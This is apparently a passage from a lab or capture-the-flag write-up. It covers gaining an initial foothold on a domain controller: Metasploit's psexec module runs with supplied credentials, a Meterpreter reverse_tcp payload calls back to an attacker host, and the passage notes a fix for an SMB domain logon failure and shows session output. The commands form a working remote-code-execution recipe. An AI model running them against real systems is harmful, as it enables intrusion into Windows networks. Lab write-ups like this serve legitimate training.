Exploitation — Initial Foothold via PSExec
Used the provided credentials (ballen:Password1) to authenticate over SMB and drop a Meterpreter payload.
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.145.173.255
set SMBUser ballen
set SMBPass Password1
set SMBDomain FLASH
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <attacker IP>
run
Troubleshooting note
The exploit failed initially with STATUS_LOGON_FAILURE (0xc000006d). The issue was that SMBDomain was set to the default . (local machine). Since the target is a domain controller, the domain FLASH had to be explicitly set. Once SMBDomain FLASH was applied, authentication succeeded:
[*] 10.145.173.255:445 - Authenticating to 10.145.173.255:445|FLASH as user 'ballen'...
[*] 10.145.173.255:445 - Selecting PowerShell target
[*] 10.145.173.255:445 - Executing the payload...
[*] Meterpreter session 1 opened
Lesson learned: Always set SMBDomain when targeting a DC — even if the credentials are correct, missing the domain will throw a logon failure.

